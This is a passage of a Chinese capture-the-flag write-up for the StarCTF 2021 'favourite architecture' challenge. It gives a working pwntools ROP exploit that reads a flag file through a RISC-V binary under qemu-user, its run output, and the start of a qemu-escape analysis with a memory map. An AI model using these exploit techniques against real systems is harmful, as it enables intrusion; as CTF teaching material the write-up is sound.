</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">endian</span> <span class="o">=</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">ROP_ctrl</span><span class="p">(</span><span class="n">target_fn</span><span class="p">,</span> <span class="n">para1</span><span class="p">,</span> <span class="n">para2</span><span class="p">,</span> <span class="n">para3</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x120</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span><span class="mh">0x1179e</span><span class="p">,</span> 
                    <span class="mi">0</span><span class="p">,</span>
                    <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="c1"># s5, s4</span>
                    <span class="mi">0</span><span class="p">,</span> <span class="n">target_fn</span><span class="o">+</span><span class="mh">0x470</span><span class="p">,</span> <span class="c1"># s3, s2</span>
                    <span class="mi">0</span><span class="p">,</span> <span class="n">target_fn</span><span class="o">+</span><span class="mh">0x478</span><span class="p">,</span> <span class="c1"># s1, s0</span>
                    <span class="mh">0x11772</span><span class="p">,</span> <span class="c1"># ra</span>
                    <span class="mi">0</span><span class="p">,</span>
                    <span class="n">para3</span><span class="p">,</span> <span class="n">para2</span><span class="p">,</span> <span class="c1"># s5, s4</span>
                    <span class="n">para1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span>  <span class="c1"># s3, s2</span>
                    <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="c1"># s1, s0</span>
                    <span class="mh">0x1178e</span><span class="p">,</span> <span class="c1"># ra</span>
                    <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="c1"># s0-s5</span>
                    <span class="n">main_addr</span><span class="p">,</span> <span class="c1"># ra</span>
                   <span class="p">)</span> 
    
    <span class="k">return</span> <span class="n">payload</span>

<span class="n">main_addr</span><span class="o">=</span><span class="mh">0x10400</span>
<span class="n">read_addr</span><span class="o">=</span><span class="mh">0x222ce</span>
<span class="n">open_addr</span><span class="o">=</span><span class="mh">0x221cc</span>
<span class="n">printf_addr</span><span class="o">=</span><span class="mh">0x1605a</span>
<span class="n">file_name</span><span class="o">=</span><span class="mh">0x6c120</span>
<span class="n">flag_addr</span><span class="o">=</span><span class="mh">0x6c110</span>
<span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;./qemu-riscv64&#34;</span> <span class="p">,</span> <span class="s2">&#34;./main&#34;</span><span class="p">],</span> <span class="n">aslr</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="n">payload</span><span class="o">=</span><span class="n">ROP_ctrl</span><span class="p">(</span><span class="n">read_addr</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">file_name</span><span class="p">,</span><span class="mi">15</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;flag:&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;/flag.txt</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="n">payload</span><span class="o">=</span><span class="n">ROP_ctrl</span><span class="p">(</span><span class="n">open_addr</span><span class="p">,</span><span class="n">file_name</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;flag:&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>

<span class="n">payload</span><span class="o">=</span><span class="n">ROP_ctrl</span><span class="p">(</span><span class="n">read_addr</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="n">flag_addr</span><span class="p">,</span><span class="mh">0x40</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;flag:&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>

<span class="n">payload</span><span class="o">=</span><span class="n">ROP_ctrl</span><span class="p">(</span><span class="n">printf_addr</span><span class="p">,</span><span class="n">flag_addr</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;flag:&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><p>成功读取本地flag文件，ubuntu2004复现成功</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="o">(</span>pwn<span class="o">)</span> pwn@ubuntu:~/share/starctf/favourite_architecture/share$ python ./exp.py 
<span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;./qemu-riscv64&#39;</span>: pid <span class="m">9209</span>
<span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
 You are wrong ._.
flag<span class="o">{</span>test<span class="o">}</span>
Input the flag: $ 
<span class="o">[</span>*<span class="o">]</span> Interrupted
<span class="o">[</span>*<span class="o">]</span> Stopped process <span class="s1">&#39;./qemu-riscv64&#39;</span> <span class="o">(</span>pid 9209<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><p>各大战队做法：</p>
<ul>
<li>六星 <a href="https://github.com/sixstars/starctf2021/blob/main/re%26pwn-favourite%20architecture/src/solve.py" target="_blank" rel="noopener noreffer">https://github.com/sixstars/starctf2021/blob/main/re%26pwn-favourite%20architecture/src/solve.py</a> 得调具体环境下的栈地址等，复现有点麻烦；纯shellcode也有点难写&hellip;</li>
<li>天璇 <a href="https://www.anquanke.com/post/id/229322#h3-13" target="_blank" rel="noopener noreffer">https://www.anquanke.com/post/id/229322#h3-13</a> 主要参考此篇复现，纯用gadget，技巧性较高，但容易复现，不受环境影响。</li>
<li>星盟 <a href="https://wemp.app/posts/c41f7523-05e1-4854-9b69-5030ede025a1" target="_blank" rel="noopener noreffer">https://wemp.app/posts/c41f7523-05e1-4854-9b69-5030ede025a1</a> gadget+orw shellcode</li>
</ul>
<h2 id="favourite-arch-2">favourite arch 2</h2>
<p>这题要求执行<code>/readflag2</code>，我们必须更进一步拿到shell。</p>
<p>漏洞同样是用户态程序的栈溢出，远程环境中的qemu被patch过，限制了其模拟程序时执行一些syscall，即在riscv层面上无法getshell。所以这题要直接日穿qemu，rce而不只是orw</p>
<p>我们需要进一步理解qemu-user，它将模拟的程序加载到自己进程的内存里，然后读取其中的数据模拟执行。但qemu-user实际上却允许模拟程序的代码访问qemu本体进程的内存（32位由于高地址太高访问不到，但64位却可以），这便是突破口。</p>
<p>来详细看看内存布局，有以下几点值得注意</p>
<ul>
<li>qemu本体被加载到内存中的地址就是0x555555554000 （aslr=False）</li>
<li>被模拟的程序在很低的地址处</li>
<li>libc仍然在高地址处</li>
<li>0x4000001000是固定的，是qemu给risc-v分配的栈空间</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">pwndbg&gt; vmmap
LEGEND: STACK <span class="p">|</span> HEAP <span class="p">|</span> CODE <span class="p">|</span> DATA <span class="p">|</span> RWX <span class="p">|</span> RODATA
           0x10000            0x6c000 r--p    5c000 <span class="m">0</span>      /mnt/hgfs/linux_share/starctf/favou
rite_architecture/share/main
           0x6c000            0x6f000 rw-p     <span class="m">3000</span> 5b000  /mnt/hgfs/linux_share/starctf/favou
rite_architecture/share/main
           0x6f000            0x93000 rw-p    <span class="m">24000</span> <span class="m">0</span>
      0x4000000000       0x4000001000 ---p     <span class="m">1000</span> <span class="m">0</span>
      0x4000001000       0x4000801000 rw-p   <span class="m">800000</span> <span class="m">0</span>
    0x561c72350000     0x561c727b9000 r-xp   <span class="m">469000</span> <span class="m">0</span>      /mnt/hgfs/linux_share/starctf/favou
rite_architecture/share/qemu-riscv64
    0x561c729b8000     0x561c729f4000 r--p    3c000 <span class="m">468000</span> /mnt/hgfs/linux_share/starctf/favou
rite_architecture/share/qemu-riscv64
    0x561c729f4000     0x561c72a20000 rw-p    2c000 4a4000 /mnt/hgfs/linux_share/starctf/favou
rite_architecture/share/qemu-riscv64
    0x561c72a20000     0x561c72a3d000 rw-p    1d000 <span class="m">0</span>
    0x561c7396a000     0x561c73a13000 rw-p    a9000 <span class="m">0</span>      <span class="o">[</span>heap<span class="o">]</span>
    0x7fa304000000     0x7fa30bfff000 rwxp  7fff000 <span class="m">0</span>
    0x7fa30bfff000     0x7fa30c000000 ---p     <span class="m">1000</span> <span class="m">0</span>
    0x7fa30c000000     0x7fa30c021000 rw-p    <span class="m">21000</span> <span class="m">0</span>
    0x7fa30c021000     0x7fa310000000 ---p  3fdf000 <span class="m">0</span>
    0x7fa3114ee000     0x7fa31156f000 rw-p    <span class="m">81000</span> <span class="m">0</span>
    0x7fa31156f000     0x7fa311570000 ---p     <span class="m">1000</span> <span class="m">0</span>
    0x7fa311570000     0x7fa311d75000 rw-p   <span class="m">805000</span> <span class="m">0</span>
    0x7fa311d75000     0x7fa311d76000 r--p     <span class="m">1000</span> <span class="m">0</span>      /usr/lib/x86_64-linux-gnu/libdl-2.3
1.so
    0x7fa311d76000     0x7fa311d78000 r-xp     <span class="m">2000</span> <span class="m">1000</span>   /usr/lib/x86_64-linux-gnu/libdl-2.3
1.so
    0x7fa311d78000     0x7fa311d79000 r--p     <span class="m">1000</span> <span class="m">3000</span>   /usr/lib/x86_64-linux-gnu/libdl-2.3
1.so
    0x7fa311d79000     0x7fa311d7a000 r--p     <span class="m">1000</span> <span class="m">3000</span>   /usr/lib/x86_64-linux-gnu/libdl-2.3
1.so
    0x7fa311d7a000     0x7fa311d7b000 rw-p     <span class="m">1000</span> <span class="m">4000</span>   /usr/lib/x86_64-linux-gnu/libdl-2.3
1.so
    0x7fa311d7b000     0x7fa311d7d000 r--p     <span class="m">2000</span> <span class="m">0</span>      /usr/lib/x86_64-linux-gnu/libffi.so
.7.1.0
    0x7fa311d7d000     0x7fa311d83000 r-xp     <span class="m">6000</span> <span class="m">2000</span>   /usr/lib/x86_64-linux-gnu/libffi.so
.7.1.0
    0x7fa311d83000     0x7fa311d84000 r--p     <span class="m">1000</span> <span class="m">8000</span>   /usr/lib/x86_64-linux-gnu/libffi.so
.7.1.0
    0x7fa311d84000     0x7fa311d85000 ---p     <span class="m">1000</span> <span class="m">9000</span>   /usr/lib/x86_64-linux-gnu/libffi.so
.7.1.0
    0x7fa311d84000     0x7fa311d85000 ---p     <span class="m">1000</span> <span class="m">9000</span>   /usr/lib/x86_64-linux-gnu/<span class="o">[</span>144/367<span class="o">]</span>
.7.1.0
    0x7fa311d85000     0x7fa311d86000 r--p     <span class="m">1000</span> <span class="m">9000</span>   /usr/lib/x86_64-linux-gnu/libffi.so
.7.1.0
    0x7fa311d86000     0x7fa311d87000 rw-p     <span class="m">1000</span> a000   /usr/lib/x86_64-linux-gnu/libffi.so
.7.1.0
    0x7fa311d87000     0x7fa311d89000 r--p     <span class="m">2000</span> <span class="m">0</span>      /usr/lib/x86_64-linux-gnu/libpcre.s
o.3.13.3
    0x7fa311d89000     0x7fa311dda000 r-xp    <span class="m">51000</span> <span class="m">2000</span>   /usr/lib/x86_64-linux-gnu/libpcre.s
o.3.13.3
    0x7fa311dda000     0x7fa311df8000 r--p    1e000 <span class="m">53000</span>  /usr/lib/x86_64-linux-gnu/libpcre.s
o.3.13.3
    0x7fa311df8000     0x7fa311df9000 r--p     <span class="m">1000</span> <span class="m">70000</span>  /usr/lib/x86_64-linux-gnu/libpcre.s
o.3.13.3
    0x7fa311df9000     0x7fa311dfa000 rw-p     <span class="m">1000</span> <span class="m">71000</span>  /usr/lib/x86_64-linux-gnu/libpcre.s
o.3.13.3
    0x7fa311dfa000     0x7fa311e04000 r--p     a000 <span class="m">0</span>      /usr/lib/x86_64-linux-gnu/libgmp.so
.10.4.0
    0x7fa311e04000     0x7fa311e64000 r-xp    <span class="m">60000</span> a000   /usr/lib/x86_64-linux-gnu/libgmp.so
.10.4.0
    0x7fa311e64000     0x7fa311e7b000 r--p    <span class="m">17000</span> 6a000  /usr/lib/x86_64-linux-gnu/libgmp.so
.10.4.0
    0x7fa311e7b000     0x7fa311e7c000 ---p     <span class="m">1000</span> <span class="m">81000</span>  /usr/lib/x86_64-linux-gnu/libgmp.so
.10.4.0
    0x7fa311e7c000     0x7fa311e7d000 r--p     <span class="m">1000</span> <span class="m">81000</span>  /usr/lib/x86_64-linux-gnu/libgmp.so
.10.4.0
    0x7fa311e7d000     0x7fa311e7e000 rw-p     <span class="m">1000</span> <span class="m">82000</span>  /usr/lib/x86_64-linux-gnu/libgmp.so
.10.4.0
    0x7fa311e7e000     0x7fa311e85000 r--p     <span class="m">7000</span> <span class="m">0</span>      /usr/lib/x86_64-linux-gnu/libhogwee
d.so.5.0
    0x7fa311e85000     0x7fa311e96000 r-xp    <span class="m">11000</span> <span class="m">7000</span>   /usr/lib/x86_64-linux-gnu/libhogwee
d.so.5.0
    0x7fa311e96000     0x7fa311eb4000 r--p    1e000 <span class="m">18000</span>  /usr/lib/x86_64-linux-gnu/libhogwee
d.so.5.0
    0x7fa311eb4000     0x7fa311eb5000 r--p     <span class="m">1000</span> <span class="m">35000</span>  /usr/lib/x86_64-linux-gnu/libhogwee
d.so.5.0
    0x7fa311eb5000     0x7fa311eb6000 rw-p     <span class="m">1000</span> <span class="m">36000</span>  /usr/lib/x86_64-linux-gnu/libhogwee
d.so.5.0
    0x7fa311eb6000     0x7fa311eb8000 rw-p     <span class="m">2000</span> <span class="m">0</span>
    0x7fa311eb8000     0x7fa311ec1000 r--p     <span class="m">9000</span> <span class="m">0</span>      /usr/lib/x86_64-linux-gnu/libnettle
.so.7.0
    0x7fa311ec1000     0x7fa311edf000 r-xp    1e000 <span class="m">9000</span>   /usr/lib/x86_64-linux-gnu/libnettle
.so.7.0
    0x7fa311edf000     0x7fa311eef000 r--p    <span class="m">10000</span> <span class="m">27000</span>  /usr/lib/x86_64-linux-gnu/libnettle
.so.7.0
    0x7fa311eef000     0x7fa311ef1000 r--p     <span class="m">2000</span> <span class="m">36000</span>  /usr/lib/x86_64-linux-gnu/libnettle
.so.7.0
    0x7fa311ef1000     0x7fa311ef2000 rw-p     <span class="m">1000</span> <span class="m">38000</span>  /usr/lib/x86_64-linux-gnu/libnettle
.so.7.0
    0x7fa311ef2000     0x7fa311ef5000 r--p     <span class="m">3000</span> <span class="m">0</span>      /usr/lib/x86_64-linux-gnu/libtasn1e
    .so.7.0                                                                             
    0x7fa311ef2000     0x7fa311ef5000 r--p     <span class="m">3000</span> <span class="m">0</span>      /usr/lib/x86_64-linux-gnu/libtasn1.
so.6.6.0
    0x7fa311ef5000     0x7fa311f01000 r-xp     c000 <span class="m">3000</span>   /usr/lib/x86_64-linux-gnu/libtasn1.
so.6.6.0
    0x7fa311f01000     0x7fa311f05000 r--p     <span class="m">4000</span> f000   /usr/lib/x86_64-linux-gnu/libtasn1.
so.6.6.0
    0x7fa311f05000     0x7fa311f06000 ---p     <span class="m">1000</span> <span class="m">13000</span>  /usr/lib/x86_64-linux-gnu/libtasn1.
so.6.6.0
    0x7fa311f06000     0x7fa311f07000 r--p     <span class="m">1000</span> <span class="m">13000</span>  /usr/lib/x86_64-linux-gnu/libtasn1.
so.6.6.0
    0x7fa311f07000     0x7fa311f08000 rw-p     <span class="m">1000</span> <span class="m">14000</span>  /usr/lib/x86_64-linux-gnu/libtasn1.
so.6.6.0
    0x7fa311f08000     0x7fa311f18000 r--p    <span class="m">10000</span> <span class="m">0</span>      /usr/lib/x86_64-linux-gnu/libunistr
ing.so.2.1.0
    0x7fa311f18000     0x7fa311f4e000 r-xp    <span class="m">36000</span> <span class="m">10000</span>  /usr/lib/x86_64-linux-gnu/libunistr
ing.so.2.1.0
    0x7fa311f4e000     0x7fa312085000 r--p   <span class="m">137000</span> <span class="m">46000</span>  /usr/lib/x86_64-linux-gnu/libunistr
ing.so.2.1.0
    0x7fa312085000     0x7fa312086000 ---p     <span class="m">1000</span> 17d000 /usr/lib/x86_64-linux-gnu/libunistr
ing.so.2.1.0
    0x7fa312086000     0x7fa312089000 r--p     <span class="m">3000</span> 17d000 /usr/lib/x86_64-linux-gnu/libunistr
ing.so.2.1.0
    0x7fa312089000     0x7fa31208a000 rw-p     <span class="m">1000</span> <span class="m">180000</span> /usr/lib/x86_64-linux-gnu/libunistr
ing.so.2.1.0
    0x7fa31208a000     0x7fa31208c000 r--p     <span class="m">2000</span> <span class="m">0</span>      /usr/lib/x86_64-linux-gnu/libidn2.s
o.0.3.6
    0x7fa31208c000     0x7fa312091000 r-xp     <span class="m">5000</span> <span class="m">2000</span>   /usr/lib/x86_64-linux-gnu/libidn2.s
o.0.3.6
    0x7fa312091000     0x7fa3120a8000 r--p    <span class="m">17000</span> <span class="m">7000</span>   /usr/lib/x86_64-linux-gnu/libidn2.s
o.0.3.6
    0x7fa3120a8000     0x7fa3120a9000 ---p     <span class="m">1000</span> 1e000  /usr/lib/x86_64-linux-gnu/libidn2.s
o.0.3.6
    0x7fa3120a9000     0x7fa3120aa000 r--p     <span class="m">1000</span> 1e000  /usr/lib/x86_64-linux-gnu/libidn2.s
o.0.3.6
    0x7fa3120aa000     0x7fa3120ab000 rw-p     <span class="m">1000</span> 1f000  /usr/lib/x86_64-linux-gnu/libidn2.s
o.0.3.6
    0x7fa3120ab000     0x7fa3120d6000 r--p    2b000 <span class="m">0</span>      /usr/lib/x86_64-linux-gnu/libp11-ki
t.so.0.3.0
    0x7fa3120d6000     0x7fa312170000 r-xp    9a000 2b000  /usr/lib/x86_64-linux-gnu/libp11-ki
t.so.0.3.0
    0x7fa312170000     0x7fa3121cc000 r--p    5c000 c5000  /usr/lib/x86_64-linux-gnu/libp11-ki
t.so.0.3.0
    0x7fa3121cc000     0x7fa3121d7000 r--p     b000 <span class="m">120000</span> /usr/lib/x86_64-linux-gnu/libp11-ki
t.so.0.3.0
    0x7fa3121d7000     0x7fa3121e1000 rw-p     a000 12b000 /usr/lib/x86_64-linux-gnu/libp11-ki
t.so.0.3.0
    0x7fa3121e1000     0x7fa312206000 r--p    <span class="m">25000</span> <span class="m">0</span>      /usr/lib/x86_64-linux-gnu/libc-2.31
.so
    0x7fa312206000     0x7fa31237e000 r-xp   <span class="m">178000</span> <span class="m">25000</span>  /usr/lib/x86_64-linux-gnu/libc-2.31
    .so                                                                                   
    0x7fa312206000     0x7fa31237e000 r-xp   <span class="m">178000</span> <span class="m">25000</span>  /usr/lib/x86_64-linux-gnu/libc-2.31
.so
    0x7fa31237e000     0x7fa3123c8000 r--p    4a000 19d000 /usr/lib/x86_64-linux-gnu/libc-2.31
.so
    0x7fa3123c8000     0x7fa3123c9000 ---p     <span class="m">1000</span> 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31
.so
    0x7fa3123c9000     0x7fa3123cc000 r--p     <span class="m">3000</span> 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31
.so
    0x7fa3123cc000     0x7fa3123cf000 rw-p     <span class="m">3000</span> 1ea000 /usr/lib/x86_64-linux-gnu/libc-2.31
.so
    0x7fa3123cf000     0x7fa3123d5000 rw-p     <span class="m">6000</span> <span class="m">0</span>
    0x7fa3123d5000     0x7fa3123dc000 r--p     <span class="m">7000</span> <span class="m">0</span>      /usr/lib/x86_64-linux-gnu/libpthrea
d-2.31.so
    0x7fa3123dc000     0x7fa3123ed000 r-xp    <span class="m">11000</span> <span class="m">7000</span>   /usr/lib/x86_64-linux-gnu/libpthrea
d-2.31.so
    0x7fa3123ed000     0x7fa3123f2000 r--p     <span class="m">5000</span> <span class="m">18000</span>  /usr/lib/x86_64-linux-gnu/libpthrea
d-2.31.so
    0x7fa3123f2000     0x7fa3123f3000 r--p     <span class="m">1000</span> 1c000  /usr/lib/x86_64-linux-gnu/libpthrea
d-2.31.so
    0x7fa3123f3000     0x7fa3123f4000 rw-p     <span class="m">1000</span> 1d000  /usr/lib/x86_64-linux-gnu/libpthrea
d-2.31.so
    0x7fa3123f4000     0x7fa3123f8000 rw-p     <span class="m">4000</span> <span class="m">0</span>
    0x7fa3123f8000     0x7fa3123fb000 r--p     <span class="m">3000</span> <span class="m">0</span>      /usr/lib/x86_64-linux-gnu/libgcc_s.
so.1
    0x7fa3123fb000     0x7fa31240d000 r-xp    <span class="m">12000</span> <span class="m">3000</span>   /usr/lib/x86_64-linux-gnu/libgcc_s.
so.1
    0x7fa31240d000     0x7fa312411000 r--p     <span class="m">4000</span> <span class="m">15000</span>  /usr/lib/x86_64-linux-gnu/libgcc_s.
so.1
    0x7fa312411000     0x7fa312412000 r--p     <span class="m">1000</span> <span class="m">18000</span>  /usr/lib/x86_64-linux-gnu/libgcc_s.
so.1
    0x7fa312412000     0x7fa312413000 rw-p     <span class="m">1000</span> <span class="m">19000</span>  /usr/lib/x86_64-linux-gnu/libgcc_s.
so.1
    0x7fa312413000     0x7fa312422000 r--p     f000 <span class="m">0</span>      /usr/lib/x86_64-linux-gnu/libm-2.31
.so
    0x7fa312422000     0x7fa3124c9000 r-xp    a7000 f000   /usr/lib/x86_64-linux-gnu/libm-2.31
.so
    0x7fa3124c9000     0x7fa312560000 r--p    <span class="m">97000</span> b6000  /usr/lib/x86_64-linux-gnu/libm-2.31
.so
    0x7fa312560000     0x7fa312561000 r--p     <span class="m">1000</span> 14c000 /usr/lib/x86_64-linux-gnu/libm-2.31
.so
    0x7fa312561000     0x7fa312562000 rw-p     <span class="m">1000</span> 14d000 /usr/lib/x86_64-linux-gnu/libm-2.31
.so
    0x7fa312562000     0x7fa31257e000 r--p    1c000 <span class="m">0</span>      /usr/lib/x86_64-linux-gnu/libglib-2
.0.so.0.6400.3
    0x7fa31257e000     0x7fa312602000 r-xp    <span class="m">84000</span> 1c000  /usr/lib/x86_64-linux-gnu/libglib-2
.0.so.0.6400.3
    0x7fa312602000     0x7fa312687000 r--p    <span class="m">85000</span> a0000  /usr/lib/x86_64-linux-gnu/libglib-2
.0.so.0.6400.3
    0x7fa312687000     0x7fa312688000 ---p     <span class="m">1000</span> <span class="m">125000</span> /usr/lib/x86_64-linux-gnu/libglib-$
</code></pre></td></tr></table>
</div>
</div><p>对内存布局有个大体的了解之后，我们需要泄露libc_base与qemu_base</p>
<p>用arch1的脚本读出/proc/self/maps，发现这还是qemu模拟的内存</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
